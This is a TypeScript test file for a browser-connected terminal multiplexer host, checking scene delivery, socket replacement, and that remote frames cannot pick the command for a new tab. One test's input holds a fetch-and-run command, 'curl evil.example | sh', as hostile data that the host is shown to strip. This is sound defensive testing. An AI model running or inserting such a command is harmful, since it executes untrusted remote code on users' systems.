// Copyright 2023-present Eser Ozvataf and other contributors. All rights reserved. Apache-2.0 license.

import * as assert from "@eserstack/test-kit/assert";
import type * as mux from "@eserstack/mux";
import { runtime } from "@eserstack/standards/cross-runtime";
import * as muxHost from "./mux-host.ts";

/** A WebSocket stand-in: keeps what the server sends and fires the events. */
const fakeSocket = () => {
  const sent: string[] = [];
  const socket = Object.assign(new EventTarget(), {
    readyState: WebSocket.OPEN as number,
    send: (data: string): void => {
      sent.push(data);
    },
    close: (): void => {
      socket.readyState = WebSocket.CLOSED;
      socket.dispatchEvent(new Event("close"));
    },
  });

  /** Delivers `message` to the server as a frame from the browser. */
  const receive = (message: unknown): void => {
    socket.dispatchEvent(
      new MessageEvent("message", { data: JSON.stringify(message) }),
    );
  };

  return { socket, sent, receive, asWebSocket: socket as unknown as WebSocket };
};

/** A PTY host that spawns nothing and records each spawn request. */
const recordingHost = (spawns: mux.SpawnRequest[]) => {
  const panes = new Set<string>();

  return (): mux.PtyHost => ({
    spawn: (request) => {
      spawns.push(request);
      panes.add(request.pane);
      return Promise.resolve();
    },
    write: () => {},
    resize: () => {},
    kill: (pane) => {
      panes.delete(pane);
    },
    forget: (pane) => {
      panes.delete(pane);
    },
    killAll: () => {
      panes.clear();
      return Promise.resolve();
    },
    has: (pane) => panes.has(pane),
  });
};

const withHost = async (
  fn: (
    host: muxHost.MuxHost,
    spawns: mux.SpawnRequest[],
    root: string,
  ) => Promise<void>,
): Promise<void> => {
  const root = await runtime.fs.makeTempDir();
  const spawns: mux.SpawnRequest[] = [];
  const host = new muxHost.MuxHost(root, {
    createHost: recordingHost(spawns),
    resolveCommand: () => Promise.resolve("claude"),
  });

  try {
    await fn(host, spawns, root);
  } finally {
    await host.killAll();
    await runtime.fs.remove(root, { recursive: true });
  }
};

const ATTACH = { t: "attach", viewport: { cols: 80, rows: 24 } } as const;

Deno.test("attachSocket sends the full scene to a socket that attaches", async () => {
  await withHost((host) => {
    const browser = fakeSocket();

    host.attachSocket(browser.asWebSocket);
    browser.receive(ATTACH);

    assert.assertEquals(browser.sent.length, 1);
    const message = JSON.parse(browser.sent[0]!);
    assert.assertEquals(message.t, "scene");
    assert.assertEquals(message.full, true);

    return Promise.resolve();
  });
});

Deno.test("attachSocket strips the command a remote frame picks for a new tab", async () => {
  await withHost((host, spawns, root) => {
    const browser = fakeSocket();

    host.attachSocket(browser.asWebSocket);
    browser.receive(ATTACH);
    browser.receive({
      t: "action",
      action: {
        type: "newTab",
        command: "sh",
        args: ["-c", "curl evil.example | sh"],
        cwd: "/",
      },
    });

    // The pane still opens, with the resolver's shell in the project root
    // instead of the frame's command line.
    assert.assertEquals(spawns.length, 1);
    assert.assertEquals(spawns[0]!.args, []);
    assert.assertEquals(spawns[0]!.cwd, root);

    return Promise.resolve();
  });
});

Deno.test("attachSocket closes the previous socket and stops at a closed one", async () => {
  await withHost(async (host) => {
    const first = fakeSocket();
    const second = fakeSocket();

    host.attachSocket(first.asWebSocket);
    host.attachSocket(second.asWebSocket);

    assert.assertEquals(first.socket.readyState, WebSocket.CLOSED);

    second.receive(ATTACH);
    const sentBeforeClose = second.sent.length;
    assert.assertEquals(sentBeforeClose, 1);

    second.socket.close();
    await host.createTab();

    assert.assertEquals(second.sent.length, sentBeforeClose);
    assert.assertEquals(first.sent, []);
  });
});
